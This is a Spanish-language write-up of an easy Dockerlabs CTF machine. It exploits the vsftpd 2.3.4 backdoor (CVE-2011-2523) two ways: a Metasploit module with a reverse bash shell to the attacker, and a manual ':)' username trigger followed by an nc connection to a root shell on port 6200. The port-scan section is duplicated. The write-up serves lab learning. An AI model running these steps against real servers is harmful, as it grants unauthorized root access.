# Tproot - Dockerlabs (Muy Fácil)

## Introducción

Máquina de la plataforma [Dockerlabs](https://dockerlabs.es/) enfocada en la explotación de una backdoor conocida en vsftpd 2.3.4 (CVE-2011-2523), obteniendo acceso root directo sin necesidad de escalada de privilegios posterior.

- **Dificultad:** Muy Fácil
- **IP objetivo:** 172.17.0.2

## Reconocimiento

### Descubrimiento de host (red Docker)

\`\`\`bash
sudo arp-scan -I docker0 --localnet --resolve
\`\`\`

Confirma la IP del contenedor víctima en la red virtual de Docker (\`172.17.0.2\`), sin depender del mensaje que muestra el script de despliegue de Dockerlabs.

### Escaneo de puertos

\`\`\`bash
nmap -p- -sV -sC --open -sS -vvv -n -Pn 172.17.0.2
\`\`\`

Resultado relevante:

\`\`\`
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
\`\`\`

El puerto 21 corre **vsftpd 2.3.4**, una versión con una vulnerabilidad pública muy conocida.

### Escaneo de puertos

\`\`\`bash
nmap -p- -sV -sC --open -sS -vvv -n -Pn 172.17.0.2
\`\`\`

Resultado relevante:

\`\`\`
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
\`\`\`

El puerto 21 corre **vsftpd 2.3.4**, una versión con una vulnerabilidad pública muy conocida.

## Identificación de la vulnerabilidad

Con \`searchsploit\` confirmamos que existe un exploit público para esa versión:

\`\`\`bash
searchsploit vsftpd
\`\`\`

\`\`\`
vsftpd 2.3.4 - Backdoor Command Execution    | unix/remote/17491.rb
\`\`\`

Corresponde al **CVE-2011-2523**: en 2011 el código fuente de vsftpd 2.3.4 fue comprometido e infectado con una backdoor intencional. Si te conectás por FTP usando un nombre de usuario que contenga la secuencia \`:)\`, el servidor abre una shell de comandos como **root** en el puerto **6200**, sin validar ninguna contraseña.

## Explotación

### Con Metasploit

\`\`\`bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
set PAYLOAD cmd/unix/reverse_bash
set LHOST 172.17.0.1   # IP de la interfaz docker0 en el atacante
run
\`\`\`

> **Nota:** el payload por defecto (\`meterpreter_reverse_tcp\`) falló porque requiere que la máquina víctima descargue un binario extra vía HTTP, algo que el contenedor minimalista no soporta. \`cmd/unix/reverse_bash\` funciona porque usa una función de red integrada en bash (\`/dev/tcp\`), sin dependencias externas.

Resultado:

\`\`\`
[+] 172.17.0.2:21 - Backdoor has been spawned!
[*] Command shell session 1 opened
\`\`\`

Confirmación de acceso:

\`\`\`bash
whoami
# root
\`\`\`

### Alternativa manual (sin Metasploit)

\`\`\`bash
ftp 172.17.0.2
# Name: :)
# Password: (cualquiera)
\`\`\`

Esto dispara la backdoor. En otra terminal:

\`\`\`bash
nc 172.17.0.2 6200
\`\`\`

Y se obtiene directamente una shell como root.

## Conclusión

Vulnerabilidad crítica de tipo backdoor intencional en el código fuente, no un fallo de programación. Da acceso root inmediato sin pasos de escalada de privilegios. Buen primer ejercicio para entender:
- Flujo completo de reconocimiento → identificación de versión → búsqueda de exploit → explotación
- Selección de payloads de Metasploit según las herramientas disponibles en el objetivo (bash vs curl/wget)
- Diferencia entre red física (Wi-Fi/LAN) y red virtual de Docker (\`docker0\`), y su impacto en la configuración de \`LHOST\`
